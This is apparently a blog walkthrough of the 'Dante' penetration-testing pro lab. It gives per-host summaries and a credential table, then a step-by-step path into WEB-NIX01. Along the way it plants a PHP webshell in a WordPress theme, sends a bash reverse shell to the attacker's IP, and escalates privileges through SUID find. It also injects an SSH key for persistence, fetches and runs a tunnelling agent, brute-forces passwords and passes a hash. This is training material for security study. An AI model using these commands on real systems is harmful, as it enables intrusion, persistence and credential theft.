---
layout: post
title: "dante"
date: 2025-11-12 
categories: Pro Lab
---
# dante


# Useful Creds

| **username** | **password** | **where it was found** | **where it can access** |
| --- | --- | --- | --- |
| shaun | password | http://10.10.110.100:65000/wordpress/.wp-config.php.swp | mysql database dante-nix01 |
| balthazar | TheJoker12345! | /home/balthazar/.bash_history | dante-nix01 |
| margaret | Welcome1!2@3# | http://172.16.1.10/nav.php?page=php://filter/read=convert.base64-encode/resource=../wordpress/wp-config.php | dante-nix02 |
| frank | TractorHeadtorchDeskmat | ~/.config/Slack/exported_data/secure/2020-05-18.json | dante-nix02 |
| ben | Welcometomyblog | sqlmap 'http://172.16.1.12/blog/category.php?id=1' --batch -D blog_admin_db -T membership_users --dump | dante-nix04 |
| julian | manchesterunited | NIX04 /etc/shadow cracked | admin-nix05, nix06 |
| sophie | TerrorInflictPurpleDirt996655 | ADMIN-NIX06 /home/julian/Desktop/SQL | dante-SQL01 |

# Persistence

## Foothold on NIX01 (Our pivot)

```bash
ssh balthazar@10.10.110.100 #TheJoker12345!

/usr/bin/find . -exec /bin/sh -p \; -quit

#now we are root; inject our pub key in their .ssh
cd /root/.ssh
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB3L2dEF1Lz4/jTwwFS9bYRZTt7PZkUx0eJmkN2vUQG6 kali@kali' >> authorized_keys

#now exit and relogin:
ssh -i dante root@10.10.110.100

#now set up ligolo-ng
#on attack
cd www
python3 -m http.server 80

#on target
wget http://10.10.16.3/agent

chmod +x agent
./agent -connect 10.10.16.3:11601 -ignore-cert

#no set up ligolo interface
sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up

sudo ip route add 172.16.1.0/24 dev ligolo

#To enable interaction with 172.16.2.0/24 network, we need tunnel from DC02
ssh -D 1080 -i katwamba.key katwamba@172.16.1.20

proxychains evil-winrm -u xadmin -H 649f65073a6672a9898cb4eb61f9684a -i 172.16.2.5

#download agent.exe
wget http://10.10.16.4/agent.exe -OutFile agent.exe

.\agent.exe -connect 10.10.16.4:11601 -ignore-cert

#now on the session
#choose the rigth session wtih xadmin
session 
start --tun ligolo-double
start

#on host
sudo ip tuntap add user kali mode tun ligolo-double
sudo ip link set ligolo-double up
sudo ip route add 172.16.2.0/24 dev ligolo-double

```

# Description

Dante is a modern, yet beginner-friendly pro lab that provides the opportunity to learn common red team methodologies, and gain familiarity with tools included in the Parrot OS Linux distribution. Dante LLC have enlisted your services to audit their network. The company has not undergone a comprehensive penetration test in the past, and want to reduce their technical debt. They are concerned that any actual breach could lead to a loss of earnings and reputation damage.

Upon breaching the perimeter, you are required to explore the network, moving laterally and vertically, until you gain administrative control over all hosts and reach domain admin. You will level up your skills in information gathering and situational awareness, be able to exploit Windows and Linux buffer overflows, gain familiarity with the Metasploit Framework, and much else!

There are many flags to be captured along the way, some on the main attack path and others in side-quests that you must go looking for. Submitting flags will propel you through the Hall of Fame, rewarding you with badges in the process.

This **Red Team Operator Level I** lab will expose players to:

- Enumeration
- Exploit Development
- Lateral Movement
- Privilege Escalation
- Web Application Attacks

Your entry point is in **10.10.110.0/24**. The firewall at **10.10.110.2** is out of scope

# Summary

## WEB-NIX01

- ftp anonymous login; learn james’ password is weak
- found wordpress in subdir /wordpress
- wpscan to scan for vulnerabilities, backup files, users
- found user james; bruteforce login password; weak password found
- logged in wordpress; edit theme to get reverse shell
- james' password is reused to login on web-nix01
- .bash_history reveals user balthazar's password
- switch to user balthazar
- found SUID set for /usr/bin/find; follow GTFObin to raise privilege to root
- ping sweep to find 9 other hosts
- set up ligolo-ng tunnel to use web-nix01 as a pivot host

## NIX02

- smb allows null authentication; enumerate shares; found notes stating wordpress folder is in Webroot
- web page has file disclosure vulnerability from http parameter page
- php filter with LFI to get wp-config.php from wordpress dir in web root; reveal Margaret's password
- ssh wth Margaret we have lshell; escape with vim; follow GTFObin
- Margaret's home dir, in .config, there are exported json file from Slack; contains password for frank
- su to frank; pspy to find python script running as root
- python script calls library; python path priority checks frank's home dir first; create fake library that creates SUID /bin/sh
- root shell

## WS01

- feroxbuster to fuzz and find /discuss subdir
- technical discussion forum; found exploit on exploitdb; can upload webshell
- powershell reverse shell from webshell; blocked by anti-virus; use custom conptyshell to bypass
- found druva application in C:\Program Files (x86)
- found druva exploit that raises that executes command as SYSTEM
- use druva exploit to execute python reverse shell to get SYSTEM shell

## NIX04

- feroxbuster to find /blog subdir
- weak credential admin:admin to logon to responsive online blog
- found SQLi exploit on Responsive Online Blog
- sqlmap to enumerate db; found credentials; cracked password hashes; valid ssh login ben
- ben has sudo privileges to execute /bin/bash
- sudo version is old; exploit CVE-2019-14287 to raise privilege to root
- crack Julian's password in /etc/shadow and save to file.

## NIX03

- null authentication allowed on smb server; enumerate share forensics to find pcap file
- follow HTTP stream in pcap file to find login details for webmin
- login to webmin as admin
- command console available on webmin that executes as root

## DC01

- nxc to find hostname and host OS version; Windows 8.1
- Windows 8.1 is known to be vulnerable to eternal blue; Metasploit to use ms17_010_psexec
- get meterpreter shell back as SYSTEM
- hashdump to get Administrator hash
- logon with evil-winrm by passing the hash
- found spreadsheet containing credentials
- netstat -ano to find additional connection to host 172.16.2.5 (DC02); can also be found with ping sweep on cmd.exe

## DC02

- from obtained credential list find ASRERoastable accounts
- crack asrep ticket with hachcat to get jbercov password
- bloodhound to map out AD
- jbercov has WriteGPLink privilege
- jbercov has DCSync rights
- secretsdump to get Administrator NT hash
- evil-winrm to logon
- meterpreter shell to execute ping sweep from cmd.exe
- discover 172.16.2.101 (ADMIN-NIX05)

## ADMIN-NIX05

- hydra to bruteforce ssh login with found credentials
- julian's cred found; login to ssh
- binary readfile has SUID set; download to host to analyse with ghidra
- binary executes as root and have buffer overflow vulnerability
- use cylic in pwndbg to find offset to RIP
- find x64 shellcode online; inject shellcode with RIP pointing towards shellcode
- ASLR is enabled in binary, shellcode is not in the same position; export shellcode into an environment variable; environment variable to process is constant
- create helper program to locate envrionment variable
- execute exploit to get root shell
- ping sweep to find host 172.16.2.6 (ADMIN-NIX06)

## ADMIN-NIX06

- find SQL login on Desktop (works in SQL01)
- found user plongbottom, his password the credential file
- su to plongbottom; he in the sudoer group
- sudo su to switch to root user

## SQL01

- use found credentials from admin-nix06 with nxc; we are MSSQL administrator
- inititate reverse shell to get foothold
- we have SeImpersonatePrivilege; vulnerable to JuicyPotato
- JuicyPotato to initiate reverse shell; we now have SYSTEM shell

## WS02

- use found credential file to bruteforce ftp login; found dharding user
- text file that tells us winrm password is a mutation of ftp password
- winrm bruteforce to find the right password
- found IObit application in C:\Program Files (x86)
- found exploit on IObit; unquoted services path; IObit runs as SYSTEM
- sc.exe to query IObit service; verifies IObit runs as SYSTEM
- Get-ServiceACL.ps1 to get ACLs on IObit service; we have permission to start, stop and ChangeConfig which allows us to update binary path name
- upload meterpreter executable; change binary path to our metepreter executable
- stop and start service with sc.exe; we now have SYSTEM shell
- hashdump to get Administrator NT hash

## WS03

- web page shows online marriage registration system; search for exploit; found RCE on exploitdb
- rce to get reverse shell
- we have seimpersonateprivilege; vulnerable to godpotato
- godpotato to initiate reverse shell; we now have SYSTEM shell

## NIX07

- Jenkins server on port 8080
- After compromising DC02, we get Jenkins credentials
- log into Jenkins; use groovy console to get reverse shell back
- linpeas to enumerate, machine is vulnerable to CVE-2021-3560 (can get root this way)
- pspy to find shell command which reveals user ian's password
- ian has disk privilege; full access to any block device in /dev; root is mounted in /dev/sda5
- use debufs to read files in root

# Attack Path

Enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/dante 10.10.110.0/24

Nmap scan report for 10.10.110.100
Host is up (0.019s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8f:a2:ff:cf:4e:3e:aa:2b:c2:6f:f4:5a:2a:d9:e9:da (RSA)
|   256 07:83:8e:b6:f7:e6:72:e9:65:db:42:fd:ed:d6:93:ee (ECDSA)
|_  256 13:45:c5:ca:db:a6:b4:ae:9c:09:7d:21:cd:9d:74:f4 (ED25519)
65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| http-robots.txt: 2 disallowed entries 
|_/wordpress DANTE{Y0u_Cant_G3t_at_m3_br0!}
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

We found a machine at 10.10.110.100. There is a FTP server that allows anon login, a ssh service and a wordpress application on port 65000. Then backend is Ubuntu.

## FTP

```bash
ftp 10.10.110.100 #anonymous:anonymous

passive  #it's taking forever to load, so we switch to passive mode
```

We are logged in. 

In Transfer/Incoming, we find a file `todo.txt`. We download the file and read its contents:

```bash
- Finalize Wordpress permission changes - PENDING
- Update links to to utilize DNS Name prior to changing to port 80 - PENDING
- Remove LFI vuln from the other site - PENDING
- Reset James' password to something more secure - PENDING
- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS
```

Let’s keep these in mind as we progress:

1. Wordpress permission vuln
2. LFI vuln
3. James’ weak password

## Foothold WEB-NIX01 via Wordpress

```bash
http://10.10.110.100:65000
```

![image.png]({{ site.baseurl }}/assets/dante/image.png)

```bash
http://10.10.110.100:65000/wordpress
```

![image.png]({{ site.baseurl }}/assets/dante/image%201.png)

We get the version of wordpress from wapplyzer:

![image.png]({{ site.baseurl }}/assets/dante/image%202.png)

Wordpress 5.4.1. Let’s enumerate vulnerable plugins with wpscan:

```bash
sudo wpscan --url http://10.10.110.100:65000/wordpress/ -e ap --plugins-detection aggressive --api-token 2xkAZXNy4fEMFKyADzmPF2VTMDYb9qV3aUtDrDK5Zzs

| [!] 50 vulnerabilities identified:
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS in Block Editor
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/831e4a94-239c-4061-b66e-f5ca0dbb84fa
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4046
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-rpwf-hrh2-39jf
 |      - https://pentest.co.uk/labs/research/subtle-stored-xss-wordpress-core/
 |      - https://www.youtube.com/watch?v=tCh7Y8z8fb4
 |
 | [!] Title: WordPress < 5.4.2 - Authenticated XSS via Media Files
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/741d07d1-2476-430a-b82f-e1228a9343a4
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4047
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-8q2w-5m27-wm27
 |
 | [!] Title: WordPress < 5.4.2 - Open Redirection
 |     Fixed in: 5.4.2
 |     References:
 |      - https://wpscan.com/vulnerability/12855f02-432e-4484-af09-7d0fbf596909
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-4048
 |      - https://wordpress.org/news/2020/06/wordpress-5-4-2-security-and-maintenance-release/
 |      - https://github.com/WordPress/WordPress/commit/10e2a50c523cf0b9785555a688d7d36a40fbeccf
 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-q6pw-gvf4-5fj5
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://10.10.110.100:65000/wordpress/wp-content/plugins/akismet/
 | Last Updated: 2025-07-15T18:17:00.000Z
 | Readme: http://10.10.110.100:65000/wordpress/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.5
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://10.10.110.100:65000/wordpress/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.1.5 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.110.100:65000/wordpress/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.110.100:65000/wordpress/wp-content/plugins/akismet/readme.txt
```

Most of the vulnerabilities requires authentication. There is one plugin, akismet v 4.1.5. Let’s search up exploits.

No exploits associated with that version. 

While that scans, let’s enumerate the application. Let’s attempt to login with default credentials at `/wp-admin`

```bash
admin:admin
```

Denied. 

Let’s also do a normal enumeration to find potential users:

```bash
sudo wpscan --url http://10.10.110.100:65000/wordpress/ --enumerate

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | Reference: https://codex.wordpress.org/Debugging_in_WordPress

[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.110.100:65000/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.9
 | Style URL: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/

[i] Config Backup(s) Identified:

[!] http://10.10.110.100:65000/wordpress/.wp-config.php.swp
 | Found By: Direct Access (Aggressive Detection)

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://10.10.110.100:65000/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] james
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

The .wp-config.php.swp seems interesting, might include sensitive information. Let’s download the file from the URL and view it. 

```bash
http://10.10.110.100:65000/wordpress/.wp-config.php.swp
```

![image.png]({{ site.baseurl }}/assets/dante/image%203.png)

Let’s use strings on it:

```bash
strings wp-config.php.swp

<SNIP>
root                                                                                                                                           
DANTE-WEB-NIX01                                                                                                                                
/var/www/html/wordpress/wp-config.php    

define( 'DB_COLLATE', '' );
/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_CHARSET', 'utf8mb4' );
/** Database Charset to use in creating database tables. */
define( 'DB_HOST', 'localhost' );
/** MySQL hostname */
define( 'DB_PASSWORD', 'password' );
/** MySQL database password */
define( 'DB_USER', 'shaun' );
/** MySQL database username */
define( 'DB_NAME', 'wordpress' );

```

We try shaun:password on wp-admin, does not work. 

Let’s try a few passwords for james, we know from the todo.txt the password is weak:

```bash
admin
james
password
```

Denied. 

Let’s try to bruteforce:

```bash
sudo wpscan -U james -P /usr/share/wordlists/rockyou.txt --url http://10.10.110.100:65000/wordpress

[!] Valid Combinations Found:
 | Username: james, Password: Toyota

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Mon Nov  3 11:49:59 2025
[+] Requests Done: 152074
[+] Cached Requests: 42
[+] Data Sent: 81.675 MB
[+] Data Received: 855.764 MB
[+] Memory used: 321.59 MB
[+] Elapsed time: 00:50:36

sudo wpscan --password-attack xmlrpc -U james -P /usr/share/wordlists/rockyou.txt --url http://10.10.110.100:65000/wordpress
```

We got james’ password.

Now let’s login:

```bash
http://10.10.110.100/wordpress/wp-admin

james:Toyota
```

![image.png]({{ site.baseurl }}/assets/dante/image%204.png)

Now let’s try and get a reverse shell. Let’s edit a theme not in use: `Appearance -> Theme Editor -> Twentynineteen -> 404 Template`:

```bash
system($_REQUEST["cmd"]);
```

Now update file.

![image.png]({{ site.baseurl }}/assets/dante/image%205.png)

Now let’s visit the page and see if we have a webshell:

```bash
http://10.10.110.100:65000/wordpress/wp-content/themes/twentynineteen/404.php?cmd=id
```

![image.png]({{ site.baseurl }}/assets/dante/image%206.png)

We now have a webshell. Let’s get a reverse shell back. Capture the request on burp, go to repeater, change the request to POST (for easier view):

```bash
bash -c 'bash -i >& /dev/tcp/10.10.16.2/4444 0>&1'
```

![image.png]({{ site.baseurl }}/assets/dante/image%207.png)

Start a listener and click send:

```bash
nc -lnvp 4444
```

![image.png]({{ site.baseurl }}/assets/dante/image%208.png)

## WEB-NIX01 Privilege Escalation

We now have shell. Let’s upgrade our shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Let’s enumerate basic information:

![image.png]({{ site.baseurl }}/assets/dante/image%209.png)

The wp-config.php in wordpress dir has the same configuration as the .swp file we found earlier. 

```bash
ls -la

total 32
drwxr-xr-x 4 root     root      4096 Aug  4  2021 .
drwxr-xr-x 3 root     root      4096 Apr 14  2021 ..
-rw-r--r-- 1 root     root     10918 May  9  2020 index.html
-rw-r--r-- 1 www-data www-data   110 Jan  8  2021 robots.txt
drwxr-xr-x 5 www-data www-data  4096 Nov  3 03:36 wordpress
drwxr-xr-x 5 root     root      4096 Aug  4  2021 wordpress.bak

```

wordpress.bak seems interesting. Let’s enumerate.

![image.png]({{ site.baseurl }}/assets/dante/image%2010.png)

Let’s also get all users on this machine: 

![image.png]({{ site.baseurl }}/assets/dante/image%2011.png)

Let’s test if james reused their passwords:

```bash
su james
```

![image.png]({{ site.baseurl }}/assets/dante/image%2012.png)

We are on.

However, when we try to ssh on into a legitimate session, it did not work. 

Let’s read the /etc/ssh/sshd_config configuration:

```bash
# Example of overriding settings on a per-user basis
#Match User anoncvs
#       X11Forwarding no
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server
DenyUsers james

```

We are not allowed ssh sessions.

Let’s check our bash history:

```bash
cat .bash_history

cd /home/balthazar
rm .mysql_history
mysql -u balthazar -p TheJoker12345!
```

Maybe this user reuses the same password:

![image.png]({{ site.baseurl }}/assets/dante/image%2013.png)

They do. Let’s try and get a ssh session using balthazar:

```bash
ssh balthazar@10.10.110.100
```

![image.png]({{ site.baseurl }}/assets/dante/image%2014.png)

Let’s enumerate basic information:

```bash
sudo -l

Sorry, user balthazar may not run sudo on localhost.

```

Let’s see if there are any information in mysql database:

```bash
mysql -u balthazar -h localhost -p

#denied.
```

Let’s login with user shaun:

```bash
mysql -u shaun -h localhost -p

mysql> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+----------------------------+---------------------+-----------------------------------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url                   | user_registered     | user_activation_key                           | user_status | display_name |
+----+------------+------------------------------------+---------------+-------------------+----------------------------+---------------------+-----------------------------------------------+-------------+--------------+
|  1 | admin      | $P$BiINvM48wJ1iyfwOroCTdFhjB2qOvO. | admin         | a@b.com           | http://127.0.0.1/wordpress | 2020-05-09 21:16:26 |                                               |           0 | admin        |
|  2 | james      | $P$B/kdWnMDyh1oMT0QCG9YAyEu8Yt.M0. | james         | james@james.james | http://james.james         | 2020-05-09 22:17:18 |                                               |           0 | James James  |
|  3 | Stoned     | $P$Btda6.sBQvgErFhDLeSn1nuk5EC58c/ | stoned        | asd@gg.com        |                            | 2025-11-03 11:34:22 | 1762169662:$P$BQmVoEBDt3OYJC9EKrXYSkjEBsaJFP1 |           0 | HH RR        |
+----+------------+------------------------------------+---------------+-------------------+----------------------------+---------------------+-----------------------------------------------+-------------+--------------+
```

We can crack the passwords in the background:

```bash
.\hashcat.exe -m 400 ..\hashes.txt ..\rockyou.txt

#only cracked james
```

Let’s check for listening ports:

```bash
ss -lntp
```

![image.png]({{ site.baseurl }}/assets/dante/image%2015.png)

Let’s upload linpeas to enumerate the machine fully:

```bash
══════════════════════════════╣ System Information ╠══════════════════════════════                            (28 results) 11:49:28 [2920/4554]
                              ╚════════════════════╝                                                                                           
╔══════════╣ Operative system                                                                                                                  
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                              
Linux version 5.4.0-29-generic (buildd@lgw01-amd64-035) (gcc version 9.3.0 (Ubuntu 9.3.0-10ubuntu2)) #33-Ubuntu SMP Wed Apr 29 14:32:27 UTC 202
0                                                                                                                                              
Distributor ID: Ubuntu                                                                                                                         
Description:    Ubuntu 20.04 LTS                                                                                                               
Release:        20.04                                                                                                                          
Codename:       focal                                                                    

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
                                                      
Vulnerable to CVE-2021-3560 *****                                                                                                                                               
╔══════════╣ Sudo version                                                                                                                      
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                 
Sudo version 1.8.31   
                      ╔════════════════════════════════════╗                                                                                   
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                             
                      ╚════════════════════════════════════╝                                                                                   
╔══════════╣ SUID - Check easy privesc, exploits and write perms

-rwsr-xr-x 1 root root 313K Feb 17  2020 /usr/bin/find ******

```

Since /usr/bin/find has SUID set, let’s go on GTFOBin to see how to exploit this. 

```bash
/usr/bin/find . -exec /bin/sh -p \; -quit
```

![image.png]({{ site.baseurl }}/assets/dante/image%2016.png)

We now have root access on this machine.

Let’s get persistence on the machine by injecting our public key:

```bash
#Let's create a ssh key on attack host
ssh-keygen -f dante
cat dante.pub

#Now cat the content and echo it to authorized_keys on target host
cd .ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB3L2dEF1Lz4/jTwwFS9bYRZTt7PZkUx0eJmkN2vUQG6 kali@kali" >> authorized_keys

#Now we try to login:
chmod 600 dante #change to secure permission to allow use of private key

ssh -i dante root@10.10.110.100
```

![image.png]({{ site.baseurl }}/assets/dante/image%2017.png)

## Lateral Movement

Let’s check our current IP:

```bash
ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.1.100  netmask 255.255.255.0  broadcast 172.16.1.255
        inet6 fe80::250:56ff:fe94:9e21  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:9e:21  txqueuelen 1000  (Ethernet)
        RX packets 3004027  bytes 507659452 (507.6 MB)
        RX errors 0  dropped 44  overruns 0  frame 0
        TX packets 3072428  bytes 3680070532 (3.6 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

Nothing interesting in /etc/hosts file. Let’s do a ping sweep.

```bash
for i in $(seq 254); do ping 172.16.1.$i -c1 -W1 & done | grep from

64 bytes from 172.16.1.10: icmp_seq=1 ttl=64 time=0.409 ms
64 bytes from 172.16.1.13: icmp_seq=1 ttl=128 time=0.571 ms
64 bytes from 172.16.1.5: icmp_seq=1 ttl=128 time=0.565 ms
64 bytes from 172.16.1.19: icmp_seq=1 ttl=64 time=0.238 ms
64 bytes from 172.16.1.12: icmp_seq=1 ttl=64 time=0.348 ms
64 bytes from 172.16.1.20: icmp_seq=1 ttl=128 time=1.02 ms
64 bytes from 172.16.1.17: icmp_seq=1 ttl=64 time=0.389 ms
64 bytes from 172.16.1.101: icmp_seq=1 ttl=128 time=0.623 ms
64 bytes from 172.16.1.102: icmp_seq=1 ttl=128 time=0.651 ms
64 bytes from 172.16.1.100: icmp_seq=1 ttl=64 time=0.013 ms

```

We can also scan with nmap:

```bash
./nmap -sn 172.16.1.0/24 -v

#after formatting
172.16.1.1
172.16.1.5
172.16.1.10
172.16.1.12
172.16.1.13
172.16.1.17
172.16.1.19
172.16.1.20
172.16.1.101
172.16.1.102
```

There are a lot of machines in the subnet. Let’s perform a nmap scan on all of them. First, we have to upload a static nmap binary, with service mappings:

```bash
#on attack
python3 -m http.server 8001

#on web-nix01
wget http://10.10.16.2:8001/nmap 
wget http://10.10.16.2:8001/nmap-services -O /etc/services
```

Now let’s scan; under enterprise pentests, nmap rate should not be this high, risk DDOSing. First, make a hosts file for all the hosts:

```bash
172.16.1.1
172.16.1.10
172.16.1.13
172.16.1.5
172.16.1.19
172.16.1.12
172.16.1.20
172.16.1.17
172.16.1.101
172.16.1.102
```

172.16.1.1 is probably just the gateway.

Now, let’s scan it with nmap

```bash
chmod +x nmap

./nmap -iL hosts -Pn -n -p- --min-rate=10000 -oN valid_hosts

```

Now transfer the file back to our host:

```bash
scp -i dante root@10.10.110.100:/tmp/valid_hosts valid_hosts
```

To make pivoting easier, let’s use ligolo-ng. We download the latest binaries and uploaded the agent.

Setup:

```bash
#on attack host
sudo ip tuntap add user kali mode tun ligolo

sudo ip link set ligolo up

```

Proxy:

Now start our proxy/server

```bash
./proxy -selfcert

INFO[0000] Loading configuration file ligolo-ng.yaml                                                                                           
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC!                                                                 
INFO[0000] Listening on 0.0.0.0:11601                                                                                                          
INFO[0000] Starting Ligolo-ng Web, API URL is set to: http://127.0.0.1:8085  
```

Connect from target:

```bash
./agent -connect 10.10.16.2:11601 -ignore-cert

WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.16.2:11601"

#on the proxy:
ligolo-ng » INFO[0319] Agent joined.                                 id=005056949e21 name=root@DANTE-WEB-NIX01 remote="10.10.110.100:32984"

```

Now connect to our agent:

```bash
session

#now choose the agent we want
```

![image.png]({{ site.baseurl }}/assets/dante/image%2018.png)

Can check their IP:

```bash
ifconfig
```

![image.png]({{ site.baseurl }}/assets/dante/image%2019.png)

Now set up the pivot box as a proxy by adding the route:

```bash
#on attack
sudo ip route add 172.16.1.0/24 dev ligolo
```

Back on our agent session from the proxy:

```bash
start
```

![image.png]({{ site.baseurl }}/assets/dante/image%2020.png)

## 172.16.1.5 DANTE-SQL01

```bash
21/tcp    open  ftp
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
5985/tcp  open  wsman
47001/tcp open  winrm
49665/tcp open  unknown
49666/tcp open  unknown
49677/tcp open  unknown
MAC Address: 00:50:56:94:6B:44 (Unknown)

sudo nmap -sC -sV 172.16.1.5 -oN DANTE-SQL01

21/tcp   open  ftp          FileZilla ftpd
| ftp-syst:
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-r--r--r-- 1 ftp ftp             44 Jan 08  2021 flag.txt
111/tcp  open  rpcbind      2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc        Microsoft Windows RPC
